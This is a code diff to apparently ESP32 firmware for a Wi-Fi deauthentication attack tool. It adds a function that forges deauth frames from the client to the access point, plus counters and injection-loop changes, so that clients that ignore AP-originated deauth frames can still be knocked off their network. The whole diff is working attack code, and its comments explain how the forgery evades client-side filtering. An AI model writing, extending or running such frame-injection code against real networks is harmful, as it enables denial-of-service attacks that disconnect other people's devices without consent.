@@ -88,6 +88,7 @@ uint32_t s_tx_err_invalid = 0;
 uint32_t s_tx_err_other = 0;
 uint32_t s_tx_dropped = 0;
 uint32_t s_blind_frames = 0;
+uint32_t s_rev_frames = 0;
 
 // The sniffer runs in the Wi-Fi task: blasting 16 raw frames from there starves
 // the driver's TX buffers (half of the calls returned ESP_ERR_NO_MEM), so the
@@ -200,18 +201,26 @@ void radio_to_sta(void) {
 
 // ------------------------------------------------------------------ frames
 
-size_t build_deauth(uint8_t* frame, const uint8_t station[6], const uint8_t bssid[6],
-                    uint16_t reason) {
+// dest/src/bssid are explicit so both directions can be forged:
+//   AP -> STA : dest = client, src = bssid, bssid = AP
+//   STA -> AP : dest = bssid,  src = client, bssid = AP
+size_t build_deauth_ex(uint8_t* frame, const uint8_t dest[6], const uint8_t src[6],
+                       const uint8_t bssid[6], uint16_t reason) {
     memset(frame, 0, 26);
     frame[0] = 0xC0;  // deauth
-    memcpy(frame + 4, station, 6);
-    memcpy(frame + 10, bssid, 6);
+    memcpy(frame + 4, dest, 6);
+    memcpy(frame + 10, src, 6);
     memcpy(frame + 16, bssid, 6);
     frame[22] = 0xF0;
     frame[23] = 0xFF;
     frame[24] = reason & 0xFF;
     frame[25] = (reason >> 8) & 0xFF;
     return 26;
+}
+
+size_t build_deauth(uint8_t* frame, const uint8_t station[6], const uint8_t bssid[6],
+                    uint16_t reason) {
+    return build_deauth_ex(frame, station, bssid, bssid, reason);
 }
 
 // Beacon (subtype 8) and probe response (subtype 5) share the same body layout.
@@ -262,6 +271,7 @@ void reset_diag_counters(void) {
     s_tx_err_other = 0;
     s_tx_dropped = 0;
     s_blind_frames = 0;
+    s_rev_frames = 0;
     s_txq_head = 0;
     s_txq_tail = 0;
     s_last_inject_ms = 0;
@@ -296,9 +306,7 @@ uint16_t next_reason(void) {
 }
 
 // Returns true when the driver accepted the frame.
-bool inject_one(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
-    uint8_t frame[32];
-    const size_t len = build_deauth(frame, station, bssid, reason);
+bool tx_raw(uint8_t* frame, size_t len) {
     const esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
     if (res != ESP_OK) {
         s_tx_err++;
@@ -320,6 +328,26 @@ bool inject_one(const uint8_t station[6], const uint8_t bssid[6], uint16_t reaso
     return true;
 }
 
+// AP -> STA: the AP appears to kick the client.
+bool inject_one(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
+    uint8_t frame[32];
+    const size_t len = build_deauth(frame, station, bssid, reason);
+    return tx_raw(frame, len);
+}
+
+// STA -> AP: the client appears to leave. The AP tears the association down and
+// usually tells the client itself, which covers clients that ignore forged
+// AP-originated deauth frames.
+bool inject_reverse(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
+    uint8_t frame[32];
+    const size_t len = build_deauth_ex(frame, bssid, station, bssid, reason);
+    if (!tx_raw(frame, len)) {
+        return false;
+    }
+    s_rev_frames++;
+    return true;
+}
+
 // Push as much of the pending burst as the driver accepts, then stop and resume
 // on the next tick (attack_step calls this every few ms).
 void drain_tx_queue(void) {
@@ -336,7 +364,8 @@ void drain_tx_queue(void) {
         if (s_mode == ATTACK_DEAUTH_MULTI) {
             const int idx = find_ap(s_burst_bssid);
             if (idx >= 0) {
-                s_aps[idx].frames += NUM_FRAMES_PER_DEAUTH + NUM_BROADCAST_PER_DEAUTH;
+                s_aps[idx].frames +=
+                    NUM_FRAMES_PER_DEAUTH + NUM_REVERSE_PER_DEAUTH + NUM_BROADCAST_PER_DEAUTH;
             }
         }
     }
@@ -345,6 +374,15 @@ void drain_tx_queue(void) {
             return;  // buffers full: retry this frame after the backoff
         }
         s_burst_left--;
+    }
+
+    // Reverse direction: forge the frame the client itself would send when
+    // leaving the BSS. Costs one frame and covers clients that filter deauth
+    // frames "from the AP".
+    for (int i = 0; i < NUM_REVERSE_PER_DEAUTH; i++) {
+        if (!inject_reverse(s_burst_client, s_burst_bssid, s_burst_reason)) {
+            return;
+        }
     }
 
     // One broadcast deauth on top of the unicast burst: plenty of cheap clients
@@ -787,6 +825,10 @@ uint32_t attack_tx_dropped(void) {
 
 uint32_t attack_blind_frames() {
     return s_blind_frames;
+}
+
+uint32_t attack_reverse_frames() {
+    return s_rev_frames;
 }
 
 void attack_set_reason(uint16_t code) {
